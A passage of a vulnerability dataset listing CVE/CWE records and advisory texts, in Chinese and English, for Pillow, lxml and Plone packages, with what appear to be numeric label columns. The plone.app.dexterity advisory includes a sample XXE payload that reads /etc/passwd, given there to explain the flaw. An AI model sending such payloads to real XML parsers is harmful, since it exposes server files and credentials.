Pillow 9.0.0 之前存在安全漏洞，该漏洞源于 PIL.ImageMath.eval 允许评估任意表达式，例如使用 Python exec 方法的表达式。",1,2
plone_plone.namedfile,Pillow,,True,,CWE-400,2022-01-04,"## Overview
[Pillow](https://python-pillow.org/) is a PIL (Python Imaging Library) fork.

Affected versions of this package are vulnerable to Denial of Service (DoS). The `JpegImagePlugin` may append an EOF marker to the end of a truncated file, so that the last segment of the data will still be processed by the decoder. If the EOF marker is not detected as such, this can lead to an infinite loop where `JpegImagePlugin` keeps trying to end the file.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `Pillow` to version 9.0.0 or higher.
## References
- [GitHub Commit](https://github.com/python-pillow/Pillow/pull/5921/commits/1059eb537639925c96d3245dcd73c106d4266c83)
- [GitHub Issue](https://github.com/python-pillow/Pillow/issues/5864#issuecomment-1003788821)
- [GitHub PR](https://github.com/python-pillow/Pillow/pull/5921)
- [Release Notes](https://pillow.readthedocs.io/en/stable/releasenotes/9.0.0.html#ensure-jpegimageplugin-stops-at-the-end-of-a-truncated-file)
",3,0
plone_plone.namedfile,Pillow,,True,CVE-2021-34552,CWE-120,2021-07-13,"Pillow是一款基于Python的图像处理库。
Pillow 中存在缓冲区错误漏洞，该漏洞源于产品的convert .c未能验证参数的安全性，攻击者可通过该漏洞引发缓冲区溢出。以下产品及版本受到影响：Pillow 8.2.0 之前版本、PIL 1.1.7 之前版本。",1,2
plone_plone.namedfile,Pillow,,True,CVE-2021-28677,CWE-20,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在输入验证错误漏洞，该漏洞由于在处理换行符（例如在打开文件时使用“  r”，“  n”）时对用户提供的输入的验证不足而存在的。远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
plone_plone.namedfile,Pillow,,True,CVE-2021-28675,CWE-252,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在资源管理错误漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,0
plone_plone.namedfile,Pillow,,True,CVE-2021-28678,CWE-345,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在数据伪造问题漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",3,0
plone_plone.namedfile,Pillow,,True,CVE-2021-28676,CWE-835,2021-04-13,"Pillow是一款基于Python的图像处理库。
Pillow存在安全漏洞，该漏洞由于对PsdImagePlugin.PsdImageFile方法中的内部资源管理不当，远程攻击者可以将特制文件传递给应用程序，并执行拒绝服务（DoS）攻击。以下产品及版本受到影响：Pillow 1.0、Pillow 1.2、Pillow 1.7.6、Pillow 1.7.7、Pillow 1.7.8、Pillow 2.0.0、Pillow 2.1.0、Pillow 2.2.0、Pillow 2.2.1、Pillow 2.2.2、Pillow 2.3.0、Pillow 2.3.1、Pillow 2.3.2、Pillow 2.4.0、Pillow 2.5.0、Pillow 2.5.1、Pillow 2.5.2、Pillow 2.5.3、Pillow 2.6.0、Pillow 2.6.1、Pillow 2.6.2、Pillow 2.7.0、Pillow 2.8.0、Pillow 2.8.1、Pillow 2.8.2、Pillow 2.9.0、Pillow 3.0.0、Pillow 3.1.0、Pillow 3.1.1、Pillow 3.1.2、Pillow 3.2.0、Pillow 3.3.0、Pillow 3.3.1、Pillow 3.3.2、Pillow 3.3.3、Pillow 3.4.0、Pillow 3.4.1、Pillow 3.4.2、Pillow 4.0.0、Pillow 4.1.0、Pillow 4.1.1、Pillow 4.2.0、Pillow 4.2.1、Pillow 4.3.0、Pillow 5.0.0、Pillow 5.1.0、Pillow 5.2.0、Pillow 5.3.0、Pillow 5.4.0、Pillow 5.4.1、Pillow 6.0.0、Pillow 6.1.0、Pillow 6.2.0、Pillow 6.2.1、Pillow 6.2.2、Pillow 6.2.3、Pillow 7.0.0、Pillow 7.0.1、Pillow 7.1.0、Pillow 7.1.1、Pillow 7.1.2、Pillow 7.2.0、Pillow 8.0.0、Pillow 8.0.1、Pillow 8.1.0、Pillow 8.1.1、Pillow 8.1.2。",2,2
plone_plone.namedfile,Pillow,,True,CVE-2023-50447,CWE-94 CWE-95,2024-01-19,"Pillow是一款基于Python的图像处理库。
Pillow 10.1.0及之前版本存在安全漏洞，该漏洞源于可以通过PIL.ImageMath.eval中的environment 参数执行任意代码。",1,0
plone_plone.namedfile,Pillow,,True,CVE-2023-44271,CWE-770,2023-11-03,"Pillow是一款基于Python的图像处理库。
Pillow 10.0.0之前版本存在安全漏洞，该漏洞源于不受控制地分配内存，从而导致服务崩溃。",2,2
plone_plone.namedfile,Pillow,,True,CVE-2014-3589,CWE-20,2014-08-20,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL和Pillow 2.3.2之前版本和2.5.2版本之前2.5.x版本的PIL/IcnsImagePlugin.py文件中存在安全漏洞。远程攻击者可通过特制的块数据利用该漏洞造成拒绝服务。",2,2
plone_plone.namedfile,Pillow,,True,CVE-2014-3007,CWE-78,2014-04-27,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
PIL 1.1.7及之前的版本和Pillow 2.3版本中存在安全漏洞。远程攻击者可借助shell元字符利用该漏洞执行任意命令。",1,2
plone_plone.namedfile,Pillow,,True,CVE-2020-35654,CWE-787,2021-01-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.0之前版本中存在缓冲区错误漏洞，当解码制作好的YCbCr文件时，由于在RGBA模式下与LibTIFF的某些解释冲突，TiffDecode会出现基于堆的缓冲区溢出。",2,0
plone_plone.namedfile,Pillow,,True,CVE-2019-19911,CWE-190,2020-01-05,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中存在输入验证错误漏洞。攻击者可利用该漏洞造成拒绝服务（进程终止）。",2,2
plone_plone.namedfile,Pillow,,True,CVE-2014-9601,CWE-20,2015-01-16,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。
Pillow 2.7.0之前版本中存在安全漏洞。远程攻击者可借助特制的PNG图像中压缩的文本块利用该漏洞造成拒绝服务。",2,2
plone_plone.namedfile,Pillow,,True,CVE-2021-25289,CWE-787,2021-03-11,"Pillow是一款基于Python的图像处理库。
Pillow 8.1.1之前版本中存在安全漏洞。该漏洞源于在解码精心编制的YCbCr文件时，TiffDecode会出现基于堆的缓冲区溢出。",1,2
plone_plone.namedfile,Pillow,,True,CVE-2020-5310,CWE-190,2020-01-02,"Pillow是一款基于Python的图像处理库。
Pillow 6.2.2之前版本中的libImaging/TiffDecode.c文件存在输入验证错误漏洞，该漏洞源于程序没有正确分配内存。远程攻击者可借助特制TIFF图像利用该漏洞导致应用程序崩溃。",1,0
plone_plone.namedfile,Pillow,,True,CVE-2014-3598,CWE-399,2015-05-01,"Python Image Library（PIL）是瑞士软件开发者Fredrik Lundh所研发的一个Python图像处理库。Jpeg2KImage是其中的一个图像处理插件。
PIL 2.5.3之前版本的Jpeg2KImagePlugin插件中存在安全漏洞。远程攻击者可借助特制的图像利用该漏洞造成拒绝服务。",2,2
plone_plone.namedfile,Pillow,,True,CVE-2024-28219,CWE-680,2024-04-01,"Pillow是一款基于Python的图像处理库。
Pillow(PIL Fork)存在安全漏洞，该漏洞源于_imagingcms.c中存在缓冲区溢出漏洞。",2,0
plone_plone.namedfile,plone.dexterity,,True,,CWE-284,2017-11-07,"## Overview
[`plone.dexterity`](https://pypi.python.org/pypi/plone.dexterity) is a framework for content types as filesystem code and TTW (Zope/CMF/Plone).

Affected Versions of this package are vulnerable to Access Restriction Bypass.

## References
- [Github ChangeLog](https://github.com/plone/plone.dexterity/blob/master/CHANGES.rst#230-2015-03-13)
- [Github PR](https://github.com/plone/plone.dexterity/pull/21)
- [Github Commit](https://github.com/plone/plone.dexterity/commit/4437908dc6d4976f5a64f903d16b31489657ac39)
",3,2
plone_Products.CMFPlone,lxml,,True,CVE-2022-2309,CWE-476,2022-07-05,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。libxml2是开源的一个用来解析XML文档的函数库。它用C语言写成，并且能为多种语言所调用，例如C语言，C++，XSH。
lxml和libxml2 2.9.10版本至2.9.14版本存在代码问题漏洞。攻击者利用该漏洞通过伪造的输入数据触发崩溃。",3,2
plone_Products.CMFPlone,lxml,,True,CVE-2014-3146,CWE-79,2014-04-15,"lxml是一个使用Python语言编写的用于处理XML和HTML的库。
lxml 3.3.4及之前版本的lxml.html.clean模块中存在不完整黑名单漏洞，该漏洞源于程序没有正确过滤link scheme中的控制字符。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,1
plone_Products.CMFPlone,lxml,,True,CVE-2021-28957,CWE-79,2021-03-21,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.2 存在跨站脚本漏洞，该漏洞源于HTML5的formaction属性。",3,0
plone_Products.CMFPlone,lxml,,True,,CWE-22,2020-12-02,"## Overview

Affected versions of this package are vulnerable to Arbitrary File Write. When writing to file paths that contain the URL escape character '%', the file path could wrongly be mangled by URL unescaping and thus write to a different file or directory.
## Remediation
Upgrade `lxml` to version 4.4.0 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/0245aba002f069a0b157282707bdf77418d1b5be)
",3,0
plone_Products.CMFPlone,lxml,,True,CVE-2020-27783,CWE-79,2020-11-27,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
Lxml 存在跨站脚本漏洞，该漏洞源于javascript通过noscript和style组合进行转义。以下产品及版本会受到影响：Debian stretch, Debian stretch (security), Debian buster, Debian bullseye, sid; Red Hat Software Collections, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 8, Red Hat Enterprise Linux 5, Red Hat Enterprise Linux 6, Red Hat Enterprise Linux 7,Red Hat Enterprise Linux 8 , Red Hat OpenStack Platform 10 (Newton), Red Hat OpenStack Platform 13 (Queens)",3,0
plone_Products.CMFPlone,lxml,,True,CVE-2018-19787,CWE-79,2018-12-02,"Lxml是Lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.2.5之前版本中存在跨站脚本漏洞，该漏洞源于lxml.html.clean模块的lxml/html/clean.py文件没有移除使用转义的javascript: URLs。远程攻击者可利用该漏洞实施跨站脚本攻击。",3,0
plone_Products.CMFPlone,lxml,,True,CVE-2021-43818,CWE-74 CWE-79,2021-12-13,"lxml是lxml个人开发者的一个可与Python交互用于定位Html中元素的软件。
lxml 4.6.5之前版本存在注入漏洞，该漏洞源于HTML Cleaner允许某些精心制作的脚本内容以及使用数据URI嵌入的SVG文件中的脚本内容通过。",3,0
plone_Products.CMFPlone,lxml,,True,,CWE-400,2024-01-01,"## Overview

Affected versions of this package are vulnerable to Denial of Service (DoS) due to race conditions when errors or user messages occur during threaded XSLT processing.

## Details

Denial of Service (DoS) describes a family of attacks, all aimed at making a system inaccessible to its intended and legitimate users.

Unlike other vulnerabilities, DoS attacks usually do not aim at breaching security. Rather, they are focused on making websites and services unavailable to genuine users resulting in downtime.

One popular Denial of Service vulnerability is DDoS (a Distributed Denial of Service), an attack that attempts to clog network pipes to the system by generating a large volume of traffic from many machines.

When it comes to open source libraries, DoS vulnerabilities allow attackers to trigger such a crash or crippling of the service by using a flaw either in the application code or from the use of open source libraries.

Two common types of DoS vulnerabilities:

* High CPU/Memory Consumption- An attacker sending crafted requests that could cause the system to take a disproportionate amount of time to process. For example, [commons-fileupload:commons-fileupload](SNYK-JAVA-COMMONSFILEUPLOAD-30082).

* Crash - An attacker sending crafted requests that could cause the system to crash. For Example,  [npm `ws` package](https://snyk.io/vuln/npm:ws:20171108)

## Remediation
Upgrade `lxml` to version 2.3.4 or higher.
## References
- [GitHub Commit](https://github.com/lxml/lxml/commit/26ae51c60462ba1567a123bc9701ff18f9c10789)
",4,0
plone_Products.CMFPlone,plone.app.content,,True,,CWE-601,2017-11-07,"## Overview
[`plone.app.content`](https://pypi.python.org/pypi/plone.app.content) is a Content Views for Plone.

Affected versions of this package are vulnerable to Open Redirect attacks.

## References
- [Github ChangeLog](https://github.com/plone/plone.app.content/blob/master/CHANGES.rst#331-2016-09-23)
- [Github PR](https://github.com/plone/plone.app.content/pull/108)
- [Github Commit](https://github.com/plone/plone.app.content/commit/ab6f71df4fb5d76d001cfe6c685a6344a2446133)
",3,2
plone_Products.CMFPlone,plone.app.contenttypes,,True,,CWE-601 CWE-79,2022-02-01,"### Impact
Plone is vulnerable to reflected cross site scripting and open redirect when an attacker can get a compromised version of the image_view_fullscreen page in a cache, for example in Varnish.
The technique is known as cache poisoning.
Any later visitor can get redirected when clicking on a link on this page.
Usually only anonymous users are affected, but this depends on your cache settings.

### Patches
New versions of plone.app.contenttypes have been released.
Version 2.2.3 works on Plone 5.2 and will be included in Plone 5.2.7.
Version 3.0.0a9 works on Plone 6 and will be included in Plone 6.0.0a3.

Note that the Products.CMFPlone package has the same problem in the 4.3 series.
In Plone 5.0-5.2, the default Products.ATContentTypes version has the same problem. See [advisory](https://github.com/plone/Products.ATContentTypes/security/advisories/GHSA-g4c2-ghfg-g5rh).
For all unpatched versions of the three packages, you can use the following workaround.

### Workaround
Make sure the image_view_fullscreen page is not stored in the cache.
In Plone:

* Login as Manager and go to Site Setup.
* Go to the 'Caching' control panel. If this does not exist, or 'Enable caching' is not checked, you should normally not be vulnerable.
* Click on the tab 'Caching operations'.
* Under 'Legacy template mappings' locate the ruleset 'Content item view'.
* From the last column ('Templates')  remove 'image_view_fullscreen'.
* Click on Save.

### Reporter
This vulnerability was responsibly disclosed to the Plone Security Team by Gustav Hansen, F-Secure Consulting. Thank you!

### For more information
If you have any questions or comments about this advisory, email us at [security@plone.org](mailto:security@plone.org)
This is also the correct address to use when you want to report a possible vulnerability.
See [our security report policy](https://plone.org/security/report).",3,0
plone_Products.CMFPlone,plone.app.contenttypes,,True,,CWE-79,2018-05-08,"## Overview
[plone-app-contenttypes](https://pypi.org/project/plone.app.contenttypes/) is a Dexterity-based content types for Plone.

Affected versions of this package are vulnerable to Cross-site Scripting (XSS) attacks in lead image caption.

## Details
A cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.

This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.

ֿInjecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.

Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.
 
The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. 

### Types of attacks
There are a few methods by which XSS can be manipulated:

|Type|Origin|Description|
|--|--|--|
|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|
|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| 
|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|
|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|

### Affected environments
The following environments are susceptible to an XSS attack:

* Web servers
* Application servers
* Web application environments

### How to prevent
This section describes the top best practices designed to specifically protect your code: 

* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. 
* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. 
* Give users the option to disable client-side scripts.
* Redirect invalid requests.
* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.
* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.
* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.


## Remediation
Upgrade `plone-app-contenttypes` to version 1.2.15 or higher.

## References
- [Pypi ChangeLog](https://pypi.org/project/plone.app.contenttypes/1.2.15/)
",3,0
plone_Products.CMFPlone,plone.app.dexterity,,True,,CWE-611,2020-12-02,"## Overview
[plone.app.dexterity](https://pypi.org/project/plone.app.dexterity) is a Dexterity is a content type framework for CMF  applications, with particular emphasis on Plone. It can be viewed as an alternative to Archetypes that is more light-weight and modular.

Affected versions of this package are vulnerable to XML External Entity (XXE) Injection via `AjaxSaveHandler`.

## Details
XXE Injection is a type of attack against an application that parses XML input.
XML is a markup language that defines a set of rules for encoding documents in a format that is both human-readable and machine-readable. By default, many XML processors allow specification of an external entity, a URI that is dereferenced and evaluated during XML processing. When an XML document is being parsed, the parser can make a request and include the content at the specified URI inside of the XML document.

Attacks can include disclosing local files, which may contain sensitive data such as passwords or private user data, using file: schemes or relative paths in the system identifier.

For example, below is a sample XML document, containing an XML element- username.

```
<xml>
<?xml version=""1.0"" encoding=""ISO-8859-1""?>
   <username>John</username>
</xml>
```

An external XML entity - `xxe`, is defined using a system identifier and present within a DOCTYPE header. These entities can access local or remote content. For example the below code contains an external XML entity that would fetch the content of  `/etc/passwd` and display it to the user rendered by `username`.

```
<xml>
<?xml version=""1.0"" encoding=""ISO-8859-1""?>
<!DOCTYPE foo [
   <!ENTITY xxe SYSTEM ""file:///etc/passwd"" >]>
   <username>&xxe;</username>
</xml>
```

Other XXE Injection attacks can access local resources that may not stop returning data, possibly impacting application availability and leading to Denial of Service.

## Remediation
Upgrade `plone.app.dexterity` to version 2.6.8 or higher.
## References
- [Collective GitHub Commit](https://github.com/collective/collective.easyform/commit/261ea800fbe3bd650a83b1fe7558ba51bd7d0c9e)
- [Plone GitHub Commit](https://github.com/plone/plone.app.dexterity/commit/b11b514fb7b79301a5562a6b63150553bf6ece2d)
",3,0
plone_Products.CMFPlone,plone.app.theming,,True,,CWE-22,2020-12-02,"## Overview
[plone.app.theming](https://pypi.org/project/plone.app.theming) is an Integrates the Diazo theming engine with Plone

Affected versions of this package are vulnerable to Arbitrary File Read via `FailingFileProtocolResolver:resolve`.
## Remediation
Upgrade `plone.app.theming` to version 4.1.6 or higher.
## References
- [GitHub Commit](https://github.com/plone/plone.app.theming/commit/b22ccb1b8db526cc426ec6451e162bb5d94481d8)
",3,0
plone_Products.CMFPlone,plone.app.workflow,,True,,CWE-352,2022-12-11,"## Overview
[plone.app.workflow](https://pypi.org/project/plone.app.workflow) is a workflow and security settings for Plone

Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF) via the `sharing.py` form, due to improper user input sanitization
## Remediation
Upgrade `plone.app.workflow` to version 1.1.0 or higher.
## References
- [GitHub Commit](https://github.com/plone/plone.app.workflow/commit/c2e300e52bb7b3ffad03c09afb42f441d58eec15)
",3,0
plone_Products.CMFPlone,plone.dexterity,,True,,CWE-284,2017-11-07,"## Overview
[`plone.dexterity`](https://pypi.python.org/pypi/plone.dexterity) is a framework for content types as filesystem code and TTW (Zope/CMF/Plone).

Affected Versions of this package are vulnerable to Access Restriction Bypass.

## References
- [Github ChangeLog](https://github.com/plone/plone.dexterity/blob/master/CHANGES.rst#230-2015-03-13)
- [Github PR](https://github.com/plone/plone.dexterity/pull/21)
- [Github Commit](https://github.com/plone/plone.dexterity/commit/4437908dc6d4976f5a64f903d16b31489657ac39)
",3,2
plone_Products.CMFPlone,plone.namedfile,,True,CVE-2023-41048,CWE-79 CWE-80,2023-09-21,"Plone是一套基于Zope应用服务器构建的开源内容管理系统（CMS）。
plone.namedfile 5.6.1、6.0.3、6.1.3 和 6.2.1 之前版本存在跨站脚本漏洞，该漏洞源于SVG images存在安全问题，之前的安全修补程序未完全修复了此问题。",4,0
plone_Products.CMFPlone,plone.portlet.collection,,True,,CWE-200,2022-04-18,"## Overview
[plone.portlet.collection](https://pypi.org/project/plone.portlet.collection) is an A portlet that fetches results from a collection

Affected versions of this package are vulnerable to Information Exposure when users without `View` permissions for the collection, are able to view the `Portlet`.
## Remediation
Upgrade `plone.portlet.collection` to version 2.0.4 or higher.
## References
- [GitHub Commit](https://github.com/plone/plone.portlet.collection/commit/acaef557bdd904aaccc9da71bd3febc2c28c5d19)
",3,2
plone_Products.CMFPlone,plone.portlet.static,,True,,CWE-79,2021-05-03,"## Overview
[plone.portlet.static](https://pypi.org/project/plone.portlet.static) is an An editable static HTML portlet for Plone.

Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via `IStaticPortlet`.
## Details

A cross-site scripting attack occurs when the attacker tricks a legitimate web-based application or site to accept a request as originating from a trusted source.

This is done by escaping the context of the web application; the web application then delivers that data to its users along with other trusted dynamic content, without validating it. The browser unknowingly executes malicious script on the client side (through client-side languages; usually JavaScript or HTML)  in order to perform actions that are otherwise typically blocked by the browser’s Same Origin Policy.

Injecting malicious code is the most prevalent manner by which XSS is exploited; for this reason, escaping characters in order to prevent this manipulation is the top method for securing code against this vulnerability.

Escaping means that the application is coded to mark key characters, and particularly key characters included in user input, to prevent those characters from being interpreted in a dangerous context. For example, in HTML, `<` can be coded as  `&lt`; and `>` can be coded as `&gt`; in order to be interpreted and displayed as themselves in text, while within the code itself, they are used for HTML tags. If malicious content is injected into an application that escapes special characters and that malicious content uses `<` and `>` as HTML tags, those characters are nonetheless not interpreted as HTML tags by the browser if they’ve been correctly escaped in the application code and in this way the attempted attack is diverted.
 
The most prominent use of XSS is to steal cookies (source: OWASP HttpOnly) and hijack user sessions, but XSS exploits have been used to expose sensitive information, enable access to privileged services and functionality and deliver malware. 

### Types of attacks
There are a few methods by which XSS can be manipulated:

|Type|Origin|Description|
|--|--|--|
|**Stored**|Server|The malicious code is inserted in the application (usually as a link) by the attacker. The code is activated every time a user clicks the link.|
|**Reflected**|Server|The attacker delivers a malicious link externally from the vulnerable web site application to a user. When clicked, malicious code is sent to the vulnerable web site, which reflects the attack back to the user’s browser.| 
|**DOM-based**|Client|The attacker forces the user’s browser to render a malicious page. The data in the page itself delivers the cross-site scripting data.|
|**Mutated**| |The attacker injects code that appears safe, but is then rewritten and modified by the browser, while parsing the markup. An example is rebalancing unclosed quotation marks or even adding quotation marks to unquoted parameters.|

### Affected environments
The following environments are susceptible to an XSS attack:

* Web servers
* Application servers
* Web application environments

### How to prevent
This section describes the top best practices designed to specifically protect your code: 

* Sanitize data input in an HTTP request before reflecting it back, ensuring all data is validated, filtered or escaped before echoing anything back to the user, such as the values of query parameters during searches. 
* Convert special characters such as `?`, `&`, `/`, `<`, `>` and spaces to their respective HTML or URL encoded equivalents. 
* Give users the option to disable client-side scripts.
* Redirect invalid requests.
* Detect simultaneous logins, including those from two separate IP addresses, and invalidate those sessions.
* Use and enforce a Content Security Policy (source: Wikipedia) to disable any features that might be manipulated for an XSS attack.
* Read the documentation for any of the libraries referenced in your code to understand which elements allow for embedded HTML.

## Remediation
Upgrade `plone.portlet.static` to version 1.2 or higher.
## References
- [GitHub Commit](https://github.com/plone/plone.portlet.static/commit/7c6f525a3df2bb71661c43c4f6b058ff25c300aa)
",3,0
plone_Products.CMFPlone,plone.session,,True,,CWE-613,2020-05-04,"## Overview
[plone.session](https://github.com/plone/plone.session/) is a package that implements secure session management for Zope sites.

Affected versions of this package are vulnerable to Insufficient Session Expiration. The default timeout of session was two hours and allowed for potential attack vectors.
## Remediation
Upgrade `plone.session` to version 3.6.2 or higher.
## References
- [GitHub Fix Commit](https://github.com/plone/plone.session/commit/0e681e60176633034fffa2418ab130c8b338eb3b)
",4,0
plone_Products.CMFPlone,Products.CMFCore,,True,CVE-2007-0240,CWE-79,2007-03-22,Zope 2.10.2及之前版本中存在跨站脚本攻击漏洞。远程攻击者可以借助一个HTTP GET请求中的未明参数，注入任意的web脚本或HTML。,4,0
